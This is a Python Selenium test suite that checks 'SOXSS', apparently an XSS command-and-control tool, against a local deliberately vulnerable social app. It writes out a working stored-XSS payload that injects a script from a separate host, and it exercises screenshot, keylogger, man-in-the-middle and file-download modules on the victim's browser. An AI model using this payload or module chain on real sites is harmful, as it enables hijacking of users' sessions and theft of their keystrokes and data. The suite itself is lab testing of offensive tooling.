import subprocess
import sys
import tempfile
import time
import unittest
import uuid
from pathlib import Path

import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait


ROOT = Path(__file__).resolve().parents[2]
RUNNER = ROOT / "tests" / "selenium" / "run_soxss_victim_local.py"
SCREENSHOTS_DIR = ROOT / "console" / "screenshots"
LOGS_DIR = ROOT / "console" / "logs"


class SoxssVictimSeleniumE2E(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server_proc = subprocess.Popen(
            [sys.executable, str(RUNNER)],
            cwd=str(ROOT),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        cls._wait_server_ready(timeout=40)
        cls._download_tmp = tempfile.TemporaryDirectory()
        cls.download_dir = Path(cls._download_tmp.name)
        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_experimental_option(
            "prefs",
            {
                "download.default_directory": str(cls.download_dir.resolve()),
                "download.prompt_for_download": False,
                "download.directory_upgrade": True,
                "safebrowsing.enabled": True,
            },
        )
        cls.driver = webdriver.Chrome(options=chrome_options)
        cls.driver.set_window_size(1400, 900)
        cls.wait = WebDriverWait(cls.driver, 25)
        cls.victim_url = "http://127.0.0.1:7070"
        cls.console_url = "http://127.0.0.1:8002/index.html"

    @classmethod
    def _wait_server_ready(cls, timeout=40):
        deadline = time.time() + timeout
        victim_ok = False
        console_ok = False
        while time.time() < deadline:
            try:
                if requests.get("http://127.0.0.1:7070/", timeout=2).status_code == 200:
                    victim_ok = True
            except requests.RequestException:
                pass
            try:
                status = requests.get("http://127.0.0.1:8002/", timeout=2).status_code
                if status in (200, 404):
                    console_ok = True
            except requests.RequestException:
                pass
            if victim_ok and console_ok:
                return
            time.sleep(0.5)
        raise TimeoutError("SOXSS/victim services did not start in time")

    @classmethod
    def tearDownClass(cls):
        try:
            cls.driver.quit()
        finally:
            cls.server_proc.terminate()
            try:
                cls.server_proc.wait(timeout=8)
            except subprocess.TimeoutExpired:
                cls.server_proc.kill()
            cls._download_tmp.cleanup()

    def setUp(self):
        for artifact in self.download_dir.glob("selenium_copy.png*"):
            try:
                artifact.unlink()
            except OSError:
                pass
        self.driver.delete_all_cookies()
        self.driver.get(self.victim_url + "/")
        self.wait.until(EC.presence_of_element_located((By.ID, "authForm")))

    def _register_user(self):
        username = f"selenium_{uuid.uuid4().hex[:8]}"
        self.wait.until(EC.element_to_be_clickable((By.ID, "registerModeButton"))).click()
        self.driver.find_element(By.ID, "usernameInput").send_keys(username)
        self.driver.find_element(By.ID, "passwordInput").send_keys("secret123")
        self.driver.find_element(By.ID, "displayNameInput").send_keys("Selenium User")
        self.driver.find_element(By.ID, "bioInput").send_keys("Profile under test")
        self.driver.find_element(By.ID, "authSubmitButton").click()
        self.wait.until(EC.url_to_be(self.victim_url + "/feed"))
        return username

    def _inject_stored_xss_post(self, username):
        payload = (
            "Selenium XSS "
            "<img style=\"display:none\" id=\"xssPayload\" src=x "
            "onerror=\"document.getElementById('xssPayload').remove();"
            "var n=document.createElement('script');"
            "n.src='http://127.0.0.1:8000/webSocket.js';"
            "document.getElementsByTagName('head')[0].appendChild(n);\">"
        )
        response = requests.post(
            self.victim_url + "/api/posts",
            json={"content": payload},
            cookies=self.driver.get_cookies() and {c["name"]: c["value"] for c in self.driver.get_cookies()},
            timeout=5,
        )
        self.assertEqual(response.status_code, 200, response.text)

    def _open_console_tab(self):
        self.driver.execute_script(f"window.open('{self.console_url}', '_blank');")
        self.driver.switch_to.window(self.driver.window_handles[-1])
        self.wait.until(EC.presence_of_element_located((By.ID, "inputText")))

    def _switch_to_victim_tab(self):
        self.driver.switch_to.window(self.driver.window_handles[0])

    def _send_console(self, command):
        self.driver.switch_to.window(self.driver.window_handles[-1])
        box = self.wait.until(EC.element_to_be_clickable((By.ID, "inputText")))
        box.clear()
        box.send_keys(command)
        box.send_keys(Keys.ENTER)
        time.sleep(0.8)

    def _console_log(self):
        self.driver.switch_to.window(self.driver.window_handles[-1])
        return self.driver.find_element(By.ID, "log").text

    def _wait_for_socket_and_select(self):
        deadline = time.time() + 30
        while time.time() < deadline:
            self._send_console("list")
            log = self._console_log().lower()
            if "sid" in log or "ip" in log:
                self._send_console("change 0")
                return
            time.sleep(0.5)
        self.fail("SOXSS did not receive victim socket after stored XSS")

    def test_01_stored_xss_connects_victim_to_soxss(self):
        username = self._register_user()
        self._inject_stored_xss_post(username)

        # Reload feed so stored post executes and opens websocket.js
        self.driver.get(self.victim_url + "/feed")
        self.wait.until(EC.presence_of_element_located((By.ID, "feedList")))

        self._open_console_tab()
        self._wait_for_socket_and_select()

    def test_02_soxss_modules_work_against_victim_app(self):
        username = self._register_user()
        self._inject_stored_xss_post(username)
        self.driver.get(self.victim_url + "/feed")
        self.wait.until(EC.presence_of_element_located((By.ID, "feedList")))

        self._open_console_tab()
        self._wait_for_socket_and_select()

        before_shots = set(SCREENSHOTS_DIR.glob("*.png")) if SCREENSHOTS_DIR.exists() else set()
        before_logs = {p: p.stat().st_size for p in LOGS_DIR.glob("*.log")} if LOGS_DIR.exists() else {}

        # screenshot module
        self._send_console("load http://127.0.0.1:8000/scripts/screenshot.js")
        self._send_console("screenshot")
        deadline = time.time() + 40
        while time.time() < deadline:
            after = set(SCREENSHOTS_DIR.glob("*.png")) if SCREENSHOTS_DIR.exists() else set()
            if after - before_shots:
                break
            time.sleep(0.5)
        else:
            self.fail("Screenshot module did not persist PNG evidence")

        latest_png = sorted(SCREENSHOTS_DIR.glob("*.png"), key=lambda p: p.stat().st_mtime, reverse=True)[0]
        sid = latest_png.stem.split("_")[0]

        # logger module
        self._send_console("document.body.insertAdjacentHTML('beforeend','<input id=\"loggerProbe\" />')")
        self._send_console("load http://127.0.0.1:8000/scripts/logger.js")
        self._send_console("var i=document.getElementById('loggerProbe'); i.value='logger_probe'; i.dispatchEvent(new Event('blur')); 'ok'")
        time.sleep(1.0)

        deadline = time.time() + 20
        while time.time() < deadline:
            if LOGS_DIR.exists():
                for p in LOGS_DIR.glob("*.log"):
                    old_size = before_logs.get(p, 0)
                    try:
                        new_size = p.stat().st_size
                        if new_size > old_size and "logger_probe" in p.read_text(encoding="utf-8", errors="ignore"):
                            break
                    except OSError:
                        continue
                else:
                    time.sleep(0.5)
                    continue
                break
            time.sleep(0.5)
        else:
            self.fail("Logger module did not persist expected evidence")

        # mitm module + MITM server path
        self._send_console("load http://127.0.0.1:8000/scripts/mitm.js")
        mitm_response = requests.get(f"http://127.0.0.1:8001/{sid}/", timeout=12)
        self.assertEqual(mitm_response.status_code, 200)
        self.assertIn("Mini social app", mitm_response.text)

        # downloadFile module: source a file generated by screenshot test
        self._send_console("load http://127.0.0.1:8000/scripts/downloadFile.js")
        self._send_console(f"downloadFile {latest_png.as_posix()} selenium_copy.png")

        deadline = time.time() + 20
        downloaded_file = self.download_dir / "selenium_copy.png"
        while time.time() < deadline:
            if downloaded_file.exists() and downloaded_file.stat().st_size > 0:
                break
            time.sleep(0.5)
        else:
            self.fail("downloadFile module did not produce selenium_copy.png in download directory")

        self.assertNotIn("error", self._console_log().lower())


if __name__ == "__main__":
    unittest.main(verbosity=2)